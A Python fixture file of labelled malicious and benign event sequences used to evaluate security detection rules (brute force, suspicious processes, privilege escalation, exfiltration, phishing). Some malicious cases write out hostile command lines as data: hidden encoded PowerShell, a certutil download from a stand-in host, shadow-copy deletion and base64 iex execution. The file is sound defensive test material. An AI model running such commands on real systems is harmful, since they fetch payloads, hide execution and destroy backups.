"""Labelled evaluation cases for every detection rule.

Each case is a small, self-contained event sequence labelled ``malicious``
or ``benign``. Cases marked ``known_limitation`` document behaviour the rule
is known to miss (or wrongly flag); they are reported honestly in the
metrics but do not fail the self-test.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

from app.detection.base import DetectionContext, EventView

T0 = datetime(2026, 1, 15, 9, 0, tzinfo=UTC)


@dataclass
class Case:
    name: str
    label: str  # "malicious" | "benign"
    events: list[EventView]
    known_limitation: str | None = None
    context: DetectionContext = field(default_factory=DetectionContext)


def _ev(n: int, minutes: float, event_type: str, **kw: object) -> EventView:
    return EventView(id=f"fx-{n}", event_time=T0 + timedelta(minutes=minutes), event_type=event_type, **kw)  # type: ignore[arg-type]


def _failures(count: int, spacing: float, user: str = "j.alvarez", src: str = "203.0.113.45") -> list[EventView]:
    return [_ev(i, i * spacing, "auth.failure", user_name=user, src_ip=src, host="vpn-gw-01", outcome="failure") for i in range(count)]


CASES: dict[str, list[Case]] = {
    "SF-AUTH-001": [
        Case("burst then success", "malicious", _failures(8, 0.5) + [_ev(99, 5, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45", host="vpn-gw-01")]),
        Case("exactly five failures then success", "malicious", _failures(5, 1) + [_ev(99, 6, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45")]),
        Case("two typos then success", "benign", _failures(2, 0.3) + [_ev(99, 1, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45")]),
        Case("many failures, no success", "benign", _failures(12, 0.2)),
        Case("failures from a different source than success", "benign", _failures(7, 0.5) + [_ev(99, 5, "auth.success", user_name="j.alvarez", src_ip="10.20.4.17")]),
        Case(
            "slow guessing spread over 30 minutes",
            "malicious",
            _failures(6, 5) + [_ev(99, 31, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45")],
            known_limitation="Low-and-slow guessing outside the ten-minute window is not detected.",
        ),
    ],
    "SF-PROC-001": [
        Case(
            "encoded powershell",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    process_name="powershell.exe",
                    parent_process="explorer.exe",
                    command_line="powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
                )
            ],
        ),
        Case(
            "certutil download",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    process_name="certutil.exe",
                    command_line="certutil.exe -urlcache -split -f http://cdn-update.test/a.bin C:\\Users\\Public\\a.bin",
                )
            ],
        ),
        Case(
            "word spawns powershell",
            "malicious",
            [_ev(1, 0, "process.start", host="hr-ws-002", process_name="powershell.exe", parent_process="WINWORD.EXE", command_line="powershell.exe -c Get-Date")],
        ),
        Case(
            "shadow copies deleted",
            "malicious",
            [_ev(1, 0, "process.start", host="file-srv-01", process_name="vssadmin.exe", command_line="vssadmin.exe Delete Shadows /All /Quiet")],
        ),
        Case(
            "normal powershell",
            "benign",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="it-ws-001",
                    process_name="powershell.exe",
                    parent_process="explorer.exe",
                    command_line="powershell.exe -File C:\\scripts\\inventory.ps1",
                )
            ],
        ),
        Case(
            "certutil decode of a certificate",
            "benign",
            [_ev(1, 0, "process.start", host="it-ws-001", process_name="certutil.exe", command_line="certutil.exe -decode cert.b64 cert.cer")],
        ),
        Case("vssadmin list", "benign", [_ev(1, 0, "process.start", host="file-srv-01", process_name="vssadmin.exe", command_line="vssadmin.exe list shadows")]),
        Case(
            "base64 piped through an alias",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    process_name="pwsh.exe",
                    command_line="pwsh -c iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFgA')))",
                )
            ],
            known_limitation="Obfuscation that avoids the -enc flag is not matched by the pattern list.",
        ),
    ],
    "SF-IAM-001": [
        Case(
            "create then add to Domain Admins",
            "malicious",
            [
                _ev(1, 0, "iam.user_created", host="dc-01", user_name="svc_backup", target_user="helpdesk_tmp"),
                _ev(2, 4, "iam.group_member_added", host="dc-01", user_name="svc_backup", target_user="helpdesk_tmp", group_name="Domain Admins"),
            ],
        ),
        Case(
            "create then add to standard group",
            "benign",
            [
                _ev(1, 0, "iam.user_created", host="dc-01", user_name="it.admin", target_user="new.hire"),
                _ev(2, 2, "iam.group_member_added", host="dc-01", user_name="it.admin", target_user="new.hire", group_name="Finance Users"),
            ],
        ),
        Case(
            "existing account promoted",
            "benign",
            [
                _ev(2, 2, "iam.group_member_added", host="dc-01", user_name="it.admin", target_user="m.chen", group_name="Administrators"),
            ],
            known_limitation=None,
        ),
        Case(
            "added to admins two hours later",
            "benign",
            [
                _ev(1, 0, "iam.user_created", host="dc-01", user_name="it.admin", target_user="lab.user"),
                _ev(2, 120, "iam.group_member_added", host="dc-01", user_name="it.admin", target_user="lab.user", group_name="Administrators"),
            ],
        ),
    ],
    "SF-DEF-001": [
        Case("security log cleared", "malicious", [_ev(1, 0, "log.cleared", host="fin-ws-014", user_name="j.alvarez")]),
        Case("sysmon stopped", "malicious", [_ev(1, 0, "service.stopped", host="fin-ws-014", process_name="Sysmon64", user_name="SYSTEM")]),
        Case("print spooler stopped", "benign", [_ev(1, 0, "service.stopped", host="fin-ws-014", process_name="Spooler", user_name="it.admin")]),
    ],
    "SF-EXT-001": [
        Case(
            "defender high alert",
            "malicious",
            [_ev(1, 0, "security.alert", host="fin-ws-014", outcome="high", message="Microsoft Defender for Endpoint: Suspicious PowerShell command line")],
        ),
        Case(
            "entra id protection medium alert",
            "malicious",
            [_ev(1, 0, "security.alert", user_name="j.alvarez@example.test", outcome="medium", message="Entra ID Protection: Unfamiliar sign-in properties")],
        ),
        Case("informational alert", "benign", [_ev(1, 0, "security.alert", host="fin-ws-014", outcome="informational", message="Microsoft Defender: Test alert")]),
        Case("low severity alert", "benign", [_ev(1, 0, "security.alert", host="fin-ws-014", outcome="low", message="Microsoft Defender: Potentially unwanted application")]),
    ],
    "SF-NET-001": [
        Case("connection on 4444", "malicious", [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="198.51.100.23", dst_port=4444, bytes_out=18000)]),
        Case(
            "large upload", "malicious", [_ev(1, 0, "network.connection", host="eng-ws-021", src_ip="10.20.8.3", dst_ip="198.51.100.77", dst_port=443, bytes_out=240 * 1024 * 1024)]
        ),
        Case(
            "watchlisted destination",
            "malicious",
            [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="203.0.113.200", dst_port=443, bytes_out=1200)],
            context=DetectionContext(watchlist_ips={"203.0.113.200"}),
        ),
        Case("normal https", "benign", [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="198.51.100.10", dst_port=443, bytes_out=5400)]),
        Case("internal port 4444", "benign", [_ev(1, 0, "network.connection", host="dev-ws-003", src_ip="10.20.4.17", dst_ip="10.20.9.5", dst_port=4444, bytes_out=900)]),
        Case(
            "c2 over 443 with small beacons",
            "malicious",
            [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="198.51.100.99", dst_port=443, bytes_out=600)],
            known_limitation="Beaconing over standard ports to non-watchlisted hosts needs frequency analysis, which is not implemented.",
        ),
    ],
    "SF-MAIL-001": [
        Case(
            "phish clicked",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "email.delivered",
                    user_name="p.osei",
                    email_sender="billing@invoice-portal.example",
                    email_subject="Overdue invoice",
                    url="https://invoice-portal.example/view",
                    domain="invoice-portal.example",
                ),
                _ev(2, 7, "dns.query", host="hr-ws-002", user_name="p.osei", domain="invoice-portal.example"),
            ],
        ),
        Case(
            "phish not clicked",
            "benign",
            [
                _ev(1, 0, "email.delivered", user_name="p.osei", url="https://invoice-portal.example/view", domain="invoice-portal.example"),
            ],
        ),
        Case(
            "different user visited domain",
            "benign",
            [
                _ev(1, 0, "email.delivered", user_name="p.osei", url="https://invoice-portal.example/view", domain="invoice-portal.example"),
                _ev(2, 5, "dns.query", host="eng-ws-021", user_name="k.nakamura", domain="invoice-portal.example"),
            ],
        ),
        Case(
            "visit before email",
            "benign",
            [
                _ev(2, 0, "dns.query", host="hr-ws-002", user_name="p.osei", domain="newsletter.example"),
                _ev(1, 10, "email.delivered", user_name="p.osei", url="https://newsletter.example/issue", domain="newsletter.example"),
            ],
        ),
        Case(
            "legitimate newsletter clicked",
            "benign",
            [
                _ev(1, 0, "email.delivered", user_name="p.osei", email_sender="news@newsletter.example", url="https://newsletter.example/issue", domain="newsletter.example"),
                _ev(2, 3, "proxy.request", host="hr-ws-002", user_name="p.osei", domain="newsletter.example"),
            ],
            known_limitation="The rule cannot tell wanted mail from phishing; it relies on analyst triage.",
        ),
    ],
}
